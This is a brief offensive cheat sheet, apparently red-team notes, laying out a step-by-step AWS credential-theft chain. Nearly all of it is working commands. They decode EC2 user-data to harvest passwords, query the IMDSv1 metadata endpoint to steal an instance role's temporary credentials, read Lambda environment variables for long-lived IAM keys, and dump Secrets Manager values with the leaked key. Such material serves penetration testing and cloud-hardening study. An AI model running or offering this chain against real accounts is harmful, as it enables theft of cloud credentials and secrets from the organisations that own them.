# EC2 IMDS Credential Theft + Lambda Secret Chain

Common AWS lateral-movement chain once you have any foothold creds or an EC2 shell:

```bash
aws ec2 describe-instances --profile <initial>                       # MetadataOptions.HttpTokens=optional -> IMDSv1 allowed
aws ec2 describe-instance-attribute --instance-id <id> --attribute userData --profile <initial>
# base64-decode the result — user-data scripts often set a password or bake in creds at launch

ssh <user>@<instance-ip>                                             # using the harvested user-data password
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>   # IMDSv1 -> steal the attached role's temp creds, no token header needed

aws lambda list-functions --region <region>                          # using the stolen role creds
aws lambda get-function --function-name <fn> --region <region>       # env vars often hold a separate IAM user's long-lived access/secret key

aws configure --profile <leaked-user>
aws secretsmanager list-secrets --profile <leaked-user>
aws secretsmanager get-secret-value --secret-id <id> --profile <leaked-user> --query SecretString --output text
```
Each hop is just "what can this principal see that it shouldn't" — `describe-instances`/`describe-instance-attribute` first, then IMDS, then whatever services the stolen role can enumerate (Lambda, S3, Secrets Manager).
